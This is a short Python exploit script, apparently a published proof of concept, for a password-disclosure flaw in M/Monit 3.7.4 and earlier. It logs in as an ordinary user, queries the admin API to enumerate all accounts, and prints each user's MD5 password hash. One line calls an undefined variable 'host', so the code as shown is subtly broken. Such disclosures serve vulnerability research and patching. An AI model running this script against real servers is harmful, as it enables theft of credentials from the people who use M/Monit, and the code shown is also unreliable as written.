"""
Vulnerability title: M/Monit <= 3.7.4 - Password Disclosure
Author: Dolev Farhi
Vulnerable version: 3.7.4
  Link: https://mmonit.com
  Date: 9/7/2020
"""
import sys
import requests

url = 'http://your_ip_here:8080'
username = 'test'
password = 'test123'

sess = requests.Session()
sess.get(host)

def login():
  print('Attempting to login...')
  data = {
    'z_username':username,
    'z_password':password
  }
  headers = {
    'Content-Type':'application/x-www-form-urlencoded'
  }
 
  resp = sess.post(url + '/z_security_check', data=data, headers=headers)
  if resp.ok:
    print('Logged in successfully.')
  else:
    print('Could not login.')
    sys.exit(1)

def steal_hashes():
  resp = sess.get(url + '/api/1/admin/users/list')
  if resp.ok:
    for i in resp.json():
      mmonit_user = i['uname']
      result = sess.get(url + '/api/1/admin/users/get?uname={}'.format(mmonit_user))
      mmonit_passw = result.json()['password']
      print('Stolen MD5 hash. User: {}, Hash: {}'.format(mmonit_user, mmonit_passw))
   
if __name__ == '__main__':
  login()
  steal_hashes()